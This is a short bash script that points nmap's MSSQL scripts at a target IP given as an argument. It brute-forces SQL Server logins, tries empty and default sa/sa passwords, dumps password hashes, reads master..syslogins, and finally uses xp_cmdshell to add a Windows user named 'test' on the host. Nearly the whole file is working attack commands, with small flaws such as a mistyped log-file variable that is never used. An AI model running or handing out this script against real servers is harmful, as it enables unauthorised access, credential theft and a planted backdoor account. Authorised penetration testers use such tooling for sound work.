#!/bin/bash          
IP=$1
LOGFILE=$IP_nmap_mssql_scan.log
nmap_path=
nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt $IP
nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt $IP
nmap -p 1433 --script ms-sql-config --script-args mssql.username=sa,mssql.password=sa $IP
nmap -sU -p 1434 --script ms-sql-dac $IP
nmap -p 1433 --script ms-sql-dump-hashes $IP
nmap -p 445 --script ms-sql-empty-password --script-args mssql.instance-all $IP
nmap -p 1433 --script ms-sql-empty-password  $IP
nmap -p 1433 --script ms-sql-hasdbaccess --script-args mssql.username=sa,mssql.password=sa $IP
nmap -p 445 --script ms-sql-info $IP
nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 $IP
nmap -p 1433 --script ms-sql-ntlm-info $IP
nmap -p 1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password=sa,ms-sql-query.query="SELECT * FROM master..syslogins" $IP
nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=sa $IP
nmap -p 445 --script ms-sql-discover,ms-sql-empty-password,ms-sql-xp-cmdshell $IP
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user test test /add" $IP